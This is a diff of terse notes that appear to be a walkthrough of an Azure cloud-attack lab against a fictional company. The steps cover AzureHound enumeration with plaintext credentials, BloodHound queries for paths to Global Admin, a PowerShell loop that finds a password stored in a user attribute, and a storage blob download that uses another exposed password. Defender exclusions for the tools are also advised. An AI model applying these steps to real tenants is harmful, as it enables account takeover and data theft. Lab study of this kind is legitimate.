@@ -1,1 +1,49 @@
+Install Bloodhound (Docker + Github)
 
+docker-compose up bloodhound (Will trigger Defender alerts. Make Exception Folder.)
+
+Once logged in, go to the Download Collectors section on the main page and download the latest and compatible AzureHound collector. Extract the collectors to a folder. (Ensure it has exception in Defender.)
+
+Find the target Tenant ID via the following URL:
+login.microsoftonline.com/megabigtech.com/.well-known/openid-configuration
+
+Next run the collectors:
+./azurehound -u "Jose.Rodriguez@megabigtech.com" -p 'Bigt3ch123!' list --tenant "2590ccef-687d-493b-ae8d-441cbab63a72" -o output.json
+
+Upload data to Bloodhound
+    Click ⚙️ → Administration
+    From the left menu under Data Collection, select File Ingest
+    Click the button UPLOAD FILE(S)
+    Either drag-and-drop the files into the upload window, or click the upload window and select the files from your file explorer
+
+Go to Cypher:
+MATCH p =(n)-[r:AZGlobalAdmin*1..]->(m) RETURN p
+
+Powershell / Bloodhound
+# Connect to Microsoft Graph
+Connect-MgGraph
+
+# Retrieve all users
+$allUsers = Get-MgUser -All
+
+# Loop through all users and retrieve their custom security attributes
+foreach ($user in $allUsers) {
+    $userAttributes = Get-MgUser -UserId $user.Id -Property "customSecurityAttributes"
+    
+    # Display the additional properties of custom security attributes for each user
+    Write-Host "User: $($user.UserPrincipalName)"
+    $userAttributes.CustomSecurityAttributes.AdditionalProperties | Format-List
+    Write-Host "---------------------------------------------"
+}
+        
+
+Results show that user archive@megabigtech.com has a custom security attribute named Helpdesk that seems to store the password of the user
+
+Use the credentials to login to Azure Portal
+
+Search for groups or navigate to Microsoft Entra ID and click Groups . Click on IT-Helpdesk to bring up its properties.
+
+
+
+# Credentials: User: security-user | Password: Imp0sec0sT!
+az storage blob download --account-name securityconfigs --container-name security-pc --name config-latest.xml --auth-mode login
